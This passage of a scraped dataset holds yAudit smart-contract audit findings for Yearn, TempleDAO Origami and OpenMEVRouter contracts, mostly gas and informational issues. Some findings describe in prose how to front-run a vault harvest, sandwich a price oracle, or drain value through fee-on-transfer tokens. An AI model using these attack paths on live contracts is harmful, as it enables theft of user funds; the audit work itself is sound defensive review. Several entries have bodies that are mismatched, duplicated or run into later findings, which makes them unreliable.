deployedVaults.length instead Recommendation Add a getter method for deployedVaults.length and remove numVaults storage variable. Developer Response Great. Fix has been taken. 7. Gas - recalculation not needed (datapunk) Proof of concept As marked in the the snippet below, there is no need to recalculate _profit.add(_debtPayment) and _profit In L#345 uint256 toFree = _profit.add(_debtPayment); //freed is math.min(wantBalance, toFree) (uint256 freed, ) = liquidatePosition(toFree); if (_profit.add(_debtPayment) > freed) { // *** if (_debtPayment > freed) { _debtPayment = freed; _profit = 0; } else { _profit = freed - _debtPayment; // *** remove } } Recommendation use toFree in place of _profit.add(_debtPayment) and remove else { ... } 8. Gas - remove tradesEnabled (datapunk) Proof of concept tradesEnabled appeared twice in StrategyConvexFactoryClonable.sol#L153, StrategyConvexFactoryClonable.sol#L301 It does not seem to have any practical usage. In case there is a usage, _removeTradeFactoryPermissions() should correspondingly mark tradesEnabled = false;. Recommendation Remove tradesEnabled Developer Response It has been removed, thanks. 9. Gas - Iterating through rewardsTokens in _setUpTradeFactory and _removeTradeFactoryPermissions (verypoor) Proof of concept If rewardsTokens is expected to be more than 1 on average (StrategyConvexFactoryClonable.sol#L291 and StrategyConvexFactoryClonable.sol#L662), and the function always iterate through all reward tokens, it would save gas to copy the rewardsTokens to a memory variable. Consequent access of the rewardsTokens and its length would only need to load from memory. Since the rewardTokens is unbounded in RewardContract, this can save more gas when there are a lot of reward tokens. Recommendation Copy rewardsTokens to memory: address[] memory _rewardsTokens = rewardsTokens; 10. Gas - Redundant external call when using staticcall (verypoor) Proof of concept BalancerGlobal.sol#L370 did not make use of the returned data from low level staticcall, instead, the function makes one extra call to registry.latestVault(lptoken); in the success case. Recommendation It's both a better practice as well as a gas saving to use try/catch syntax introduced since Solidity 6.0. It removes the need to encode calldata and decode returned data, it also gets rid of the external call in case of success. Alternatively, the function can make use of the returned data from staticcall (staticcall returns data after Solidity 5.0). Informational Findings 1. Informational - Upgrade Pragma (devtooligan) The pragma used in these contracts is 0.6.12. There have been significant changes made to Solidity since which include new safety features, bug fixes, and optimizations.", "labels": ["yAudit", "Severity: Gas", "Difficulty: n/a"]}, {"title": "16. recalculation not needed", "html_url": "https://github.com/yAudit/reports/blob/main/md/06-2022-Yearn-BalancerLPFactory.md", "body": "As marked in the the snippet below, there is no need to recalculate _profit.add(_debtPayment) and _profit In L#345 uint256 toFree = _profit.add(_debtPayment); //freed is math.min(wantBalance, toFree) (uint256 freed, ) = liquidatePosition(toFree); if (_profit.add(_debtPayment) > freed) { // *** if (_debtPayment > freed) { _debtPayment = freed; _profit = 0; } else { _profit = freed - _debtPayment; // *** remove } } Recommendation use toFree in place of _profit.add(_debtPayment) and remove else { ... } 8. Gas - remove tradesEnabled (datapunk) Proof of concept tradesEnabled appeared twice in StrategyConvexFactoryClonable.sol#L153, StrategyConvexFactoryClonable.sol#L301 It does not seem to have any practical usage. In case there is a usage, _removeTradeFactoryPermissions() should correspondingly mark tradesEnabled = false;. Recommendation Remove tradesEnabled Developer Response It has been removed, thanks. 9. Gas - Iterating through rewardsTokens in _setUpTradeFactory and _removeTradeFactoryPermissions (verypoor) Proof of concept If rewardsTokens is expected to be more than 1 on average (StrategyConvexFactoryClonable.sol#L291 and StrategyConvexFactoryClonable.sol#L662), and the function always iterate through all reward tokens, it would save gas to copy the rewardsTokens to a memory variable. Consequent access of the rewardsTokens and its length would only need to load from memory. Since the rewardTokens is unbounded in RewardContract, this can save more gas when there are a lot of reward tokens. Recommendation Copy rewardsTokens to memory: address[] memory _rewardsTokens = rewardsTokens; 10. Gas - Redundant external call when using staticcall (verypoor) Proof of concept BalancerGlobal.sol#L370 did not make use of the returned data from low level staticcall, instead, the function makes one extra call to registry.latestVault(lptoken); in the success case. Recommendation It's both a better practice as well as a gas saving to use try/catch syntax introduced since Solidity 6.0. It removes the need to encode calldata and decode returned data, it also gets rid of the external call in case of success. Alternatively, the function can make use of the returned data from staticcall (staticcall returns data after Solidity 5.0). Informational Findings 1. Informational - Upgrade Pragma (devtooligan) The pragma used in these contracts is 0.6.12. There have been significant changes made to Solidity since which include new safety features, bug fixes, and optimizations.", "labels": ["yAudit", "Severity: Gas", "Difficulty: n/a"]}, {"title": "17. remove tradesEnabled", "html_url": "https://github.com/yAudit/reports/blob/main/md/06-2022-Yearn-BalancerLPFactory.md", "body": "tradesEnabled appeared twice in StrategyConvexFactoryClonable.sol#L153, StrategyConvexFactoryClonable.sol#L301 It does not seem to have any practical usage. In case there is a usage, _removeTradeFactoryPermissions() should correspondingly mark tradesEnabled = false;. Recommendation Remove tradesEnabled Developer Response It has been removed, thanks. 9. Gas - Iterating through rewardsTokens in _setUpTradeFactory and _removeTradeFactoryPermissions (verypoor) Proof of concept If rewardsTokens is expected to be more than 1 on average (StrategyConvexFactoryClonable.sol#L291 and StrategyConvexFactoryClonable.sol#L662), and the function always iterate through all reward tokens, it would save gas to copy the rewardsTokens to a memory variable. Consequent access of the rewardsTokens and its length would only need to load from memory. Since the rewardTokens is unbounded in RewardContract, this can save more gas when there are a lot of reward tokens. Recommendation Copy rewardsTokens to memory: address[] memory _rewardsTokens = rewardsTokens; 10. Gas - Redundant external call when using staticcall (verypoor) Proof of concept BalancerGlobal.sol#L370 did not make use of the returned data from low level staticcall, instead, the function makes one extra call to registry.latestVault(lptoken); in the success case. Recommendation It's both a better practice as well as a gas saving to use try/catch syntax introduced since Solidity 6.0. It removes the need to encode calldata and decode returned data, it also gets rid of the external call in case of success. Alternatively, the function can make use of the returned data from staticcall (staticcall returns data after Solidity 5.0). Informational Findings 1. Informational - Upgrade Pragma (devtooligan) The pragma used in these contracts is 0.6.12. There have been significant changes made to Solidity since which include new safety features, bug fixes, and optimizations.", "labels": ["yAudit", "Severity: Gas", "Difficulty: n/a"]}, {"title": "18. Iterating through rewardsTokens in _setUpTradeFactory and _removeTradeFactoryPermissions", "html_url": "https://github.com/yAudit/reports/blob/main/md/06-2022-Yearn-BalancerLPFactory.md", "body": "If rewardsTokens is expected to be more than 1 on average (StrategyConvexFactoryClonable.sol#L291 and StrategyConvexFactoryClonable.sol#L662), and the function always iterate through all reward tokens, it would save gas to copy the rewardsTokens to a memory variable. Consequent access of the rewardsTokens and its length would only need to load from memory. Since the rewardTokens is unbounded in RewardContract, this can save more gas when there are a lot of reward tokens. Recommendation Copy rewardsTokens to memory: address[] memory _rewardsTokens = rewardsTokens; 10. Gas - Redundant external call when using staticcall (verypoor) Proof of concept BalancerGlobal.sol#L370 did not make use of the returned data from low level staticcall, instead, the function makes one extra call to registry.latestVault(lptoken); in the success case. Recommendation It's both a better practice as well as a gas saving to use try/catch syntax introduced since Solidity 6.0. It removes the need to encode calldata and decode returned data, it also gets rid of the external call in case of success. Alternatively, the function can make use of the returned data from staticcall (staticcall returns data after Solidity 5.0). Informational Findings 1. Informational - Upgrade Pragma (devtooligan) The pragma used in these contracts is 0.6.12. There have been significant changes made to Solidity since which include new safety features, bug fixes, and optimizations.", "labels": ["yAudit", "Severity: Gas", "Difficulty: n/a"]}, {"title": "19. Redundant external call when using staticcall", "html_url": "https://github.com/yAudit/reports/blob/main/md/06-2022-Yearn-BalancerLPFactory.md", "body": "BalancerGlobal.sol#L370 did not make use of the returned data from low level staticcall, instead, the function makes one extra call to registry.latestVault(lptoken); in the success case. Recommendation It's both a better practice as well as a gas saving to use try/catch syntax introduced since Solidity 6.0. It removes the need to encode calldata and decode returned data, it also gets rid of the external call in case of success. Alternatively, the function can make use of the returned data from staticcall (staticcall returns data after Solidity 5.0). Informational Findings 1. Informational - Upgrade Pragma (devtooligan) The pragma used in these contracts is 0.6.12. There have been significant changes made to Solidity since which include new safety features, bug fixes, and optimizations.", "labels": ["yAudit", "Severity: Gas", "Difficulty: n/a"]}, {"title": "20. Upgrade Pragma", "html_url": "https://github.com/yAudit/reports/blob/main/md/06-2022-Yearn-BalancerLPFactory.md", "body": "20. Upgrade Pragma", "labels": ["yAudit", "Severity: Informational", "Difficulty: n/a"]}, {"title": "21. Missing events in BalancerGlobal & StrategyConvexFactoryClonable", "html_url": "https://github.com/yAudit/reports/blob/main/md/06-2022-Yearn-BalancerLPFactory.md", "body": "StrategyConvexFactoryClonable has several occurrences of the safeApprove method calls. This method has been deprecated by OpenZeppelin and its usage is discouraged.", "labels": ["yAudit", "Severity: Informational", "Difficulty: n/a"]}, {"title": "22. ERC20.safeApprove is deprecated", "html_url": "https://github.com/yAudit/reports/blob/main/md/06-2022-Yearn-BalancerLPFactory.md", "body": "StrategyConvexFactoryClonable has several occurrences of the safeApprove method calls. This method has been deprecated by OpenZeppelin and its usage is discouraged.", "labels": ["yAudit", "Severity: Informational", "Difficulty: n/a"]}, {"title": "23. incorrect comment", "html_url": "https://github.com/yAudit/reports/blob/main/md/06-2022-Yearn-BalancerLPFactory.md", "body": "L505 comment on turnOffRewards() says it will set the allowance on the router to 0. This doesnt happen in turnOffRewards", "labels": ["yAudit", "Severity: Informational", "Difficulty: n/a"]}, {"title": "24. hardcoded addresses", "html_url": "https://github.com/yAudit/reports/blob/main/md/06-2022-Yearn-BalancerLPFactory.md", "body": "Hard coded addresses in multiple places: StrategyConvexFactoryClonable.sol and BalancerGlobal.sol.", "labels": ["yAudit", "Severity: Informational", "Difficulty: n/a"]}, {"title": "25. VaultRegistry.latestVault() functions can consume all gas", "html_url": "https://github.com/yAudit/reports/blob/main/md/06-2022-Yearn-BalancerLPFactory.md", "body": "Vault registry is a proxy and 0xc3efbfdb50cf06e8e5bb623af28678d72caeafea is its current implementation. It has 2 latestVault() functions: function latestVault(address _token) external view returns (address) { address[] memory tokenVaults = vaults[_token][VaultType.DEFAULT]; // dev: no vault for token return tokenVaults[tokenVaults.length - 1]; // dev: no vault for token } function latestVault(address _token, VaultType _type) external view returns (address) { address[] memory tokenVaults = vaults[_token][_type]; return tokenVaults[tokenVaults.length - 1]; // dev: no vault for token } Both the functions copy the storage array in memory.", "labels": ["yAudit", "Severity: Medium", "Difficulty: n/a"]}, {"title": "1. Harvesting vault can be front-run for profit", "html_url": "https://github.com/yAudit/reports/blob/main/md/01-2023-TempleDAO-Origami.md", "body": "Calling harvestRewards() will collect and distribute rewards. A bad actor can deposit tokens into the ovToken before the harvest and withdraw from ovToken right after. The sharesToReserves value will instantaneously increase and the attacker will be able to withdraw more tokens than deposited with reduced incentives for users to invest in the protocol in the future.", "labels": ["yAudit", "Severity: High", "Difficulty: n/a"]}, {"title": "2. _handleGmxRewards() returned values can lead to wrong accounting", "html_url": "https://github.com/yAudit/reports/blob/main/md/01-2023-TempleDAO-Origami.md", "body": "The function _handleGmxRewards() calculates GMX rewards based on balance changes and claimable rewards from GLP without considering if the claimed tokens are staked. When staking rewards, the code doesn't set to zero esGmxFromGlp. This is inconsistent with esGmxFromGmx computed using a balance change esGmxFromGlp and will be zero if rewards get staked. OrigamiGmxEarnAccount.sol#L396-L424", "labels": ["yAudit", "Severity: Medium", "Difficulty: n/a"]}, {"title": "3. Use glpRewardRouter for fetching glp trackers", "html_url": "https://github.com/yAudit/reports/blob/main/md/01-2023-TempleDAO-Origami.md", "body": "Currently, both routers point to the same trackers, but this could change. Deployed glpRewardRouter, for GMX trackers aren't set, points to address 0. The same could happen for gmxRewardRouter, GLP trackers could point to address 0.", "labels": ["yAudit", "Severity: Low", "Difficulty: n/a"]}, {"title": "4. No Chainlink staleness check in oraclePrice()", "html_url": "https://github.com/yAudit/reports/blob/main/md/01-2023-TempleDAO-Origami.md", "body": "The Chainlink latestRoundData() function returns price data along with the roundId and timestamp of the data. If the data is stale, it should be discarded. Otherwise the protocol will trust outdated data that could lead to a loss of value from using an inaccurate exchange rate. It is recommended to check the roundId and timestamp values that the oracle returns, as shown in other security report findings here and here.", "labels": ["yAudit", "Severity: Low", "Difficulty: n/a"]}, {"title": "5. Variables could be immutables", "html_url": "https://github.com/yAudit/reports/blob/main/md/01-2023-TempleDAO-Origami.md", "body": "These variables can be declared immutable: /// @notice $GMX IERC20Upgradeable public gmxToken; /// @notice $esGMX - escrowed GMX IERC20Upgradeable public esGmxToken; /// @notice $wrappedNative - wrapped ETH/AVAX IERC20Upgradeable public wrappedNativeToken; These three variables won't change. The contract constructor can set them appropriately.", "labels": ["yAudit", "Severity: Gas", "Difficulty: n/a"]}, {"title": "6. Initialize variable only if needed", "html_url": "https://github.com/yAudit/reports/blob/main/md/01-2023-TempleDAO-Origami.md", "body": "Variable esGmxReinvested is initialized before the if statement but it's only used inside the if block.", "labels": ["yAudit", "Severity: Gas", "Difficulty: n/a"]}, {"title": "7. Reuse local variable", "html_url": "https://github.com/yAudit/reports/blob/main/md/01-2023-TempleDAO-Origami.md", "body": "Variable fromToken can be reused instead of initializing the new variable tokenIn. The same applies to variable tokenOut. Local variable reserveAmount can be dropped from here and here if inline is used like this: underlyingQuoteData.underlyingExitQuoteData.investmentTokenAmount = _redeemReservesFromShares", "labels": ["yAudit", "Severity: Gas", "Difficulty: n/a"]}, {"title": "8. Use msg.sender not owner()", "html_url": "https://github.com/yAudit/reports/blob/main/md/01-2023-TempleDAO-Origami.md", "body": "It is cheaper to call msg.sender instead of ownable() when they both return the same value. If this change is made in the constructor of MintableToken, the range of gas used on the deployment of MintableToken is reduced from the original range of 2296764-2296884 to 2296354-2296474, saving roughly 400 gas.", "labels": ["yAudit", "Severity: Gas", "Difficulty: n/a"]}, {"title": "9. Incorrect comment", "html_url": "https://github.com/yAudit/reports/blob/main/md/01-2023-TempleDAO-Origami.md", "body": "File OrigamiGmxInvestment has a comment with an incorrect file name.", "labels": ["yAudit", "Severity: Informational", "Difficulty: n/a"]}, {"title": "10. Oracles price can be exploited", "html_url": "https://github.com/yAudit/reports/blob/main/md/01-2023-TempleDAO-Origami.md", "body": "TokenPrices.sol#L74: this price oracle can be exploited with a single block sandwich attack. TokenPrices.sol#L85: this price oracle can be exploited via a multi-block attack by block producers. More info.", "labels": ["yAudit", "Severity: Informational", "Difficulty: n/a"]}, {"title": "11. Update comment to NatSpec format", "html_url": "https://github.com/yAudit/reports/blob/main/md/01-2023-TempleDAO-Origami.md", "body": "In file OrigamiGmxManager variables primaryEarnAccount and secondaryEarnAccount could be in NatSpec format. At least two comments (1, 2) are missing the @notice NatSpec tag. Finally, the comment on reservesToShares() is identical to the comment on sharesToReserves(), which is incorrect. The comment for reservesToShares() should be reversed to read \"How many shares given a number of reserve tokens\".", "labels": ["yAudit", "Severity: Informational", "Difficulty: n/a"]}, {"title": "12. Verify fees and rewards addresses", "html_url": "https://github.com/yAudit/reports/blob/main/md/01-2023-TempleDAO-Origami.md", "body": "Setter functions in OrigamiGmxManager for feeCollector and rewards aggregators doesn't verify input for the default 0 value. There are no checks to prevent an address of 0 when the fees and rewards are distributed.", "labels": ["yAudit", "Severity: Informational", "Difficulty: n/a"]}, {"title": "13. Remove removeReserves(uint256 amount)", "html_url": "https://github.com/yAudit/reports/blob/main/md/01-2023-TempleDAO-Origami.md", "body": "The function enables operators to take all reserveToken which can after be redeemed for other tokens depending on the OrigamiInvestment implementation. Even recoverToken(address _token, address _to, uint256 _amount) function, which is limited to only the owner, verifies the owner cannot drain the protocol.", "labels": ["yAudit", "Severity: Informational", "Difficulty: n/a"]}, {"title": "14. Trader Joe AMM is moving liquidity to a new AMM design", "html_url": "https://github.com/yAudit/reports/blob/main/md/01-2023-TempleDAO-Origami.md", "body": "Trader Joe is used as a price oracle on TokenPrices.sol#L74. Trader Joe announced a new AMM design with breaking ABI changes. The design will allow anyone, not just Trader Joe, to create new trading pools, so liquidity is expected to move to the new AMM. announcement doc", "labels": ["yAudit", "Severity: Informational", "Difficulty: n/a"]}, {"title": "15. Incorrect NatSpec", "html_url": "https://github.com/yAudit/reports/blob/main/md/01-2023-TempleDAO-Origami.md", "body": "On Operators.sol#L19 @dev NatSpec specifies this __Operators_init() initializes the owner, but it's not initializing the owner.", "labels": ["yAudit", "Severity: Informational", "Difficulty: n/a"]}, {"title": "16. addToReserveAmount could be a percentage value", "html_url": "https://github.com/yAudit/reports/blob/main/md/01-2023-TempleDAO-Origami.md", "body": "In _compoundOvGmxRewards() and _compoundOvGlpRewards(), the number of tokens to add to the reserve could be calculated using the returned value from investWithToken() and a percentage. This change would improve the precision of tokens added to the reserve, making it easier to send 100% of the rewards after slippage to the reserve.", "labels": ["yAudit", "Severity: Informational", "Difficulty: n/a"]}, {"title": "17. Replace deprecated dependency", "html_url": "https://github.com/yAudit/reports/blob/main/md/01-2023-TempleDAO-Origami.md", "body": "draft-ERC20Permit.sol is the old file in @openzeppelin/contracts which has been replaced with ERC20Permit.sol. Remove the import of draft-ERC20Permit.sol and instead import ERC20Permit.sol. A related simplification is the ERC20.sol dependency can be removed from MintableToken because it is already imported through ERC20Permit.sol.", "labels": ["yAudit", "Severity: Informational", "Difficulty: n/a"]}, {"title": "18. Unusual Operator.sol implementation", "html_url": "https://github.com/yAudit/reports/blob/main/md/01-2023-TempleDAO-Origami.md", "body": "The Operator.sol contract is implemented in the same pattern as contracts from openzeppelin-contracts-upgradeable. This includes inheriting Initializeable and having an init function. But unlike other OZ upgradeable contracts, the init functions in Operator.sol don't do anything. There is no difference in the contract if it is initialize or not. A side effect of how this contract is used by other contracts is that every contract that inherits Operator.sol will have its own list of operators. If the intent is to manage only a single list of operators that have access to several different contracts, then consider deploying Operator.sol on its own, rather than as a dependency, and integrate it with the other contracts accordingly.", "labels": ["yAudit", "Severity: Informational", "Difficulty: n/a"]}, {"title": "19. Reconsider using DEFAULT_ADMIN_ROLE", "html_url": "https://github.com/yAudit/reports/blob/main/md/01-2023-TempleDAO-Origami.md", "body": "OpenZeppelin's documentation for DEFAULT_ADMIN_ROLE warns that the role is effectively a superuser. If the only changing of roles is through addMinter() and revokeRole(), using DEFAULT_ADMIN_ROLE and importing AccessControl may be overkill. It could be simpler to maintain a mapping of addresses that have this access instead of inheriting the library. Related to this, addMinter() and removeMinter() have duplicate modifiers. In the existing code, the caller must be the owner because of the modifier in MintableToken and the caller must be the adminRole because of the modifier in AccessControl. Consider removing the onlyOwner modifier to save gas.", "labels": ["yAudit", "Severity: Informational", "Difficulty: n/a"]}, {"title": "20. Consider zero for minAmount", "html_url": "https://github.com/yAudit/reports/blob/main/md/01-2023-TempleDAO-Origami.md", "body": "glpRewardRouter.mintAndStakeGlp() has two minAmount arguments. Only one of these is really necessary. Consider removing the other and replacing it with a zero minAmount depending on the standard use case for the mintAndStakeGlp() function.", "labels": ["yAudit", "Severity: Informational", "Difficulty: n/a"]}, {"title": "21. Broken link", "html_url": "https://github.com/yAudit/reports/blob/main/md/01-2023-TempleDAO-Origami.md", "body": "TokenPrices.sol links to https://docs.uniswap.org/sdk/guides/fetching-prices which returns Page Not Found. Consider linking to the archived page https://web.archive.org/web/20210918154903/https://docs.uniswap.org/sdk/guides/fetching-prices.", "labels": ["yAudit", "Severity: Informational", "Difficulty: n/a"]}, {"title": "22. Typo", "html_url": "https://github.com/yAudit/reports/blob/main/md/01-2023-TempleDAO-Origami.md", "body": "adggregator -> aggregator", "labels": ["yAudit", "Severity: Informational", "Difficulty: n/a"]}, {"title": "1. The swap and stake mechanisms in OpenMevZapper leave funds in the contract", "html_url": "https://github.com/yAudit/reports/blob/main/md/05-2022-OpenMEVRouter.md", "body": "Both swapAndStakeLiquidity and swapETHAndStakeLiquidity take the input tokens or ETH sent by a user, divide it by 2, swap it into the B token, and stake these tokens as a pair. However, this approach leaves some of the B token in the contract due to the reserve asset ratio change before and after the swap.", "labels": ["yAudit", "Severity: High", "Difficulty: n/a"]}, {"title": "2. Using normal functions for fee-on-transfer tokens causes value loss", "html_url": "https://github.com/yAudit/reports/blob/main/md/05-2022-OpenMEVRouter.md", "body": "The NatSpec comment for removeLiquidityETHSupportingFeeOnTransferTokens() includes Identical to removeLiquidityETH, but succeeds for tokens that take a fee on transfer The only difference in these functions, and what is implied to cause the revert condition in removeLiquidityETH(), is the amount used in safeTransfer(). removeLiquidityETH() has an amount of amountToken, while removeLiquidityETHSupportingFeeOnTransferTokens() uses ERC20(token).balanceOf(address(this)) - balanceBefore. This does cause a revert in Uniswap's code because of the Uniswap assumption that the router holds no token balance, but OpenMevRouter can hold a token balance. The process of value loss is: Fee-on-transfer token is held by the router. This can happen either with an initial deposit by the Manifold team or from backrun arbitrage profits. The devs suggested the tokens that will be sent to the router will likely be tokens that Aave does not support flashloans for, which could include lesser known tokens with fee-on-transfer support. User wants to remove liquidity from WETH-ERC20 pair where the ERC20 has a non-zero fee-on-transfer. Instead of using removeLiquidityETHSupportingFeeOnTransferTokens(), the user calls removeLiquidityETH(). The code of removeLiquidityETHSupportingFeeOnTransferTokens() and removeLiquidityETH() is identical except for the amount in ERC20(token).safeTransfer(). The amountToken value used in removeLiquidityETH() is greater than the amount of fee-on-transfer tokens received from the removeLiquidity() call, so the amount transferred to the user will include some of the token balance that was held by the router before the user's remove liquidity interaction. Result: The router lost value in the form of the transfer-on-fee token", "labels": ["yAudit", "Severity: High", "Difficulty: n/a"]}, {"title": "3. Backrun arb not designed for fee-on-transfer tokens", "html_url": "https://github.com/yAudit/reports/blob/main/md/05-2022-OpenMEVRouter.md", "body": "While Aave and Kashi do not currently allow flashloans on any fee-on-transfer tokens, this call of _arb() using internal router contract funds is problematic. The first and second swaps are performed with _asmSwap(), which have a safeTransfer() performed first to send the token to the pair address. It is assumed that the amountOut value calculated by OpenMevLibrary.getAmountOut() accurately stores the amount of tokens that the router contract receives from the swap process. Instead, to support fee-on-transfer tokens, a calculation of ERC20(token).balanceOf(address(this)) - balanceBefore as found in the router function removeLiquidityETHSupportingFeeOnTransferTokens() should be used. The _arb() function can even cause problems when neither the first nor last token is a fee-on-transfer token, but one of the intermediate swaps uses a fee-on-transfer token. Because the _backrunSwaps() function loops through the array of swaps, any of the backrun swaps that involve a fee-on-transfer token could be problematic.", "labels": ["yAudit", "Severity: High", "Difficulty: n/a"]}, {"title": "4. Failed flashloan arbitrage reverts the original swap", "html_url": "https://github.com/yAudit/reports/blob/main/md/05-2022-OpenMEVRouter.md", "body": "These lines include the revert for each flashloan [1, 2].", "labels": ["yAudit", "Severity: Medium", "Difficulty: n/a"]}, {"title": "5. Edge case suboptimal arb profit", "html_url": "https://github.com/yAudit/reports/blob/main/md/05-2022-OpenMEVRouter.md", "body": "The logic branch checks if contractAssetBalance >= optimalAmount, otherwise a flashloan is used.", "labels": ["yAudit", "Severity: Low", "Difficulty: n/a"]}, {"title": "6. One failed arb can revert otherwise profitable arb", "html_url": "https://github.com/yAudit/reports/blob/main/md/05-2022-OpenMEVRouter.md", "body": "The _backrunSwaps() function loops through the array of swaps. Imagine a scenario where _backrunSwaps() is called with a swaps array of length 4. Assume the 1st, 2nd, and 4th backrun swaps are profitable, but the 3rd backrun swap is not. Performing this series of four backrun swaps can still be net profitable even if one of the individual backrun swaps is not. The reason the 3rd backrun swap is not profitable may be because the flashloan fee costs more than the profit of this arb, which reverts here or here, or a similar revert can happen if the router contract funds are used for the arb and the amount received is less than expected. The result is the transaction reverts and OpenMevRouter will miss out on the arb profits if the swaps had been completed even if one individual backrun swap wasn't profitable.", "labels": ["yAudit", "Severity: Low", "Difficulty: n/a"]}, {"title": "7. Max approval granted to spender", "html_url": "https://github.com/yAudit/reports/blob/main/md/05-2022-OpenMEVRouter.md", "body": "ERC20(token).safeApprove(spender, type(uint256).max); in _approveTokenIfNeeded approves the spend to spent the entire balance.", "labels": ["yAudit", "Severity: Low", "Difficulty: n/a"]}, {"title": "8. No check For Aave flashloan balance", "html_url": "https://github.com/yAudit/reports/blob/main/md/05-2022-OpenMEVRouter.md", "body": "L915 of OpenMevRouter", "labels": ["yAudit", "Severity: Low", "Difficulty: n/a"]}, {"title": "9. Use _isNonZero() for gas savings", "html_url": "https://github.com/yAudit/reports/blob/main/md/05-2022-OpenMEVRouter.md", "body": "9. Use _isNonZero() for gas savings", "labels": ["yAudit", "Severity: Gas", "Difficulty: n/a"]}, {"title": "10. Use _inc() instead of ++ and _dec() instead of --", "html_url": "https://github.com/yAudit/reports/blob/main/md/05-2022-OpenMEVRouter.md", "body": "There is one instance of an increment improvement. There are two instances of a double decrement that could be replaced with _dec(_decr()) or with unchecked { length - 2; }: First instance Second instance", "labels": ["yAudit", "Severity: Gas", "Difficulty: n/a"]}, {"title": "11. Bitshifting is cheaper than multiplication or division", "html_url": "https://github.com/yAudit/reports/blob/main/md/05-2022-OpenMEVRouter.md", "body": "There are four instance of divide by 2 operations that can use bitshifting for gas efficiency: First instance Second instance Third instance Fourth instance", "labels": ["yAudit", "Severity: Gas", "Difficulty: n/a"]}, {"title": "12. Unnecessary zero initialization", "html_url": "https://github.com/yAudit/reports/blob/main/md/05-2022-OpenMEVRouter.md", "body": "12. Unnecessary zero initialization", "labels": ["yAudit", "Severity: Gas", "Difficulty: n/a"]}, {"title": "13. Payable functions can save gas", "html_url": "https://github.com/yAudit/reports/blob/main/md/05-2022-OpenMEVRouter.md", "body": "The following functions have the onlyOwner modifier and can be marked as payable First function Second function Third function", "labels": ["yAudit", "Severity: Gas", "Difficulty: n/a"]}, {"title": "14. Avoid && logic in require statements", "html_url": "https://github.com/yAudit/reports/blob/main/md/05-2022-OpenMEVRouter.md", "body": "One instance of require with && logic was found.", "labels": ["yAudit", "Severity: Gas", "Difficulty: n/a"]}, {"title": "15. Declare constant internal when possible", "html_url": "https://github.com/yAudit/reports/blob/main/md/05-2022-OpenMEVRouter.md", "body": "The bento constant should be internal if possible.", "labels": ["yAudit", "Severity: Gas", "Difficulty: n/a"]}, {"title": "16. Replace require with errors in OpenMevRouter", "html_url": "https://github.com/yAudit/reports/blob/main/md/05-2022-OpenMEVRouter.md", "body": "One instance in _addLiquidity (require(amountAOptimal <= amountADesired);) and another instance in addLiquidityETH (require(IWETH(weth).transfer(pair, amountETH));, which can be replaced with safeTransfer as is done in swapExactETHForTokens).", "labels": ["yAudit", "Severity: Gas", "Difficulty: n/a"]}, {"title": "17. Remove unused code", "html_url": "https://github.com/yAudit/reports/blob/main/md/05-2022-OpenMEVRouter.md", "body": "First instance Second instance Third instance", "labels": ["yAudit", "Severity: Gas", "Difficulty: n/a"]}, {"title": "18. Use simple comparison", "html_url": "https://github.com/yAudit/reports/blob/main/md/05-2022-OpenMEVRouter.md", "body": "The _addLiquidity() function in OpenMenRouter.sol contains this code: if (amountBOptimal <= amountBDesired) { // require(amountBOptimal >= amountBMin, 'UniswapV2Router: INSUFFICIENT_B_AMOUNT'); if (amountBOptimal < amountBMin) revert InsufficientBAmount(); // revert InsufficientBAmount({ available: amountBOptimal, required: amountBMin }); (amountA, amountB) = (amountADesired, amountBOptimal); } else { uint256 amountAOptimal = OpenMevLibrary.quote(amountBDesired, reserveB, reserveA); require(amountAOptimal <= amountADesired); // require(amountAOptimal >= amountAMin, 'UniswapV2Router: INSUFFICIENT_A_AMOUNT'); if (amountAOptimal < amountAMin) revert InsufficientAAmount(); // revert InsufficientAAmount({ available: amountAOptimal, required: amountAMin }); (amountA, amountB) = (amountAOptimal, amountBDesired); } By switching around the if/else clauses, we can replace the compound operator with a simple one if (amountBOptimal > amountBDesired) { uint256 amountAOptimal = OpenMevLibrary.quote(amountBDesired, reserveB, reserveA); require(amountAOptimal <= amountADesired); // require(amountAOptimal >= amountAMin, 'UniswapV2Router: INSUFFICIENT_A_AMOUNT'); if (amountAOptimal < amountAMin) revert InsufficientAAmount(); // revert InsufficientAAmount({ available: amountAOptimal, required: amountAMin }); (amountA, amountB) = (amountAOptimal, amountBDesired); } else { // require(amountBOptimal >= amountBMin, 'UniswapV2Router: INSUFFICIENT_B_AMOUNT'); if (amountBOptimal < amountBMin) revert InsufficientBAmount(); // revert InsufficientBAmount({ available: amountBOptimal, required: amountBMin }); (amountA, amountB) = (amountADesired, amountBOptimal); } Another instance of this improvement is found with the comparison >= 1. Two other instances of this are in OpenMevLibrary.sol (lines 270 and 331), but to show the example from _swapSupportingFeeOnTransferTokens(): swaps[i].isBackrunable = ((1000 * amountInput) / reserveInput) >= 1; Because >= 1 equates to > 0, and G1 shows how != 0 or _isNonZero() is better than > 0, the comparison can be simplified to swaps[i].isBackrunable = _isNonZero(((1000 * amountInput) / reserveInput));", "labels": ["yAudit", "Severity: Gas", "Difficulty: n/a"]}, {"title": "19. Combine reserve value checks", "html_url": "https://github.com/yAudit/reports/blob/main/md/05-2022-OpenMEVRouter.md", "body": "Most places where OpenMevLibrary.getAmountOut() in OpenMevZapper results in duplicated reserve checks.", "labels": ["yAudit", "Severity: Gas", "Difficulty: n/a"]}, {"title": "20. Use msg global vars directly", "html_url": "https://github.com/yAudit/reports/blob/main/md/05-2022-OpenMEVRouter.md", "body": "msg.value is unnecessarily cached in: addLiquidityETH() swapETHForExactTokens() swapETHAndStakeLiquidity() msg.value can replace swaps[0].amountIn swapExactETHForTokens() here and here", "labels": ["yAudit", "Severity: Gas", "Difficulty: n/a"]}, {"title": "21. Remove duplicate internal function call", "html_url": "https://github.com/yAudit/reports/blob/main/md/05-2022-OpenMEVRouter.md", "body": "One example: First call Second call", "labels": ["yAudit", "Severity: Gas", "Difficulty: n/a"]}, {"title": "22. deadline special case not aligned with permit", "html_url": "https://github.com/yAudit/reports/blob/main/md/05-2022-OpenMEVRouter.md", "body": "EIP-2612 text ensure() function", "labels": ["yAudit", "Severity: Gas", "Difficulty: n/a"]}, {"title": "23. Replace pair.swap() with _asmSwap()", "html_url": "https://github.com/yAudit/reports/blob/main/md/05-2022-OpenMEVRouter.md", "body": "Line 699 of OpenMEVRouter.sol", "labels": ["yAudit", "Severity: Gas", "Difficulty: n/a"]}, {"title": "24. Remove a sortTokens call", "html_url": "https://github.com/yAudit/reports/blob/main/md/05-2022-OpenMEVRouter.md", "body": "The first sortTokens() call The second sortTokens() call happens in pairFor()", "labels": ["yAudit", "Severity: Gas", 